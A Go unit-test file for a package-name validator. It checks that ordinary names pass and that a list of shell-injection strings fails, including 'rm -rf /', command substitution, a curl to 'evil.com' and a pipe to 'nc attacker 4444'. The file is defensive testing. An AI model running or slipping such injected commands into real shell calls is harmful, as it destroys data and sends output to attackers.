package packages

import "testing"

func TestValidatePackageName_AcceptsRealNames(t *testing.T) {
	for _, n := range []string{
		"firefox",
		"python3",
		"python3.10",
		"gcc-c++",
		"libssl-dev",
		"linux-headers-generic",
		"@types/node",
		"@scope/pkg",
		"homebrew/cask/firefox",
		"org.mozilla.firefox",
		"gcc:i386",
		"node18",
	} {
		if err := ValidatePackageName(n); err != nil {
			t.Errorf("expected %q to be valid: %v", n, err)
		}
	}
}

func TestValidatePackageName_RejectsEmpty(t *testing.T) {
	if err := ValidatePackageName(""); err == nil {
		t.Error("expected empty package name to be rejected")
	}
}

func TestValidatePackageName_RejectsShellInjection(t *testing.T) {
	cases := []string{
		"; rm -rf /",
		"firefox; reboot",
		"$(id)",
		"`whoami`",
		"firefox && curl evil.com",
		"firefox | nc attacker 4444",
		"firefox\nrm -rf /",
		"firefox\r\nrm",
		"firefox$IFS$9rm",
		"firefox || true",
		"firefox > /etc/passwd",
		"firefox < /dev/zero",
		"firefox 'evil'",
		"firefox\"evil\"",
		"firefox\\evil",
		"firefox*",
		"firefox?",
		"firefox~root",
		"firefox{a,b}",
		"firefox(sub)",
		"firefox[sub]",
		" firefox", // leading space
		"firefox ", // trailing space
		"firefox#evil",
		"firefox=evil",
	}
	for _, n := range cases {
		if err := ValidatePackageName(n); err == nil {
			t.Errorf("expected shell-injection candidate %q to be rejected", n)
		}
	}
}

func TestValidatePackageName_RejectsTooLong(t *testing.T) {
	long := make([]byte, 129)
	for i := range long {
		long[i] = 'a'
	}
	if err := ValidatePackageName(string(long)); err == nil {
		t.Error("expected 129-char package name to be rejected (cap 128)")
	}
}

func TestValidatePackageName_RejectsLeadingDotOrDash(t *testing.T) {
	for _, n := range []string{".firefox", "-firefox", "/firefox", "+firefox", ":firefox", ".."} {
		if err := ValidatePackageName(n); err == nil {
			t.Errorf("expected leading-special %q to be rejected", n)
		}
	}
}
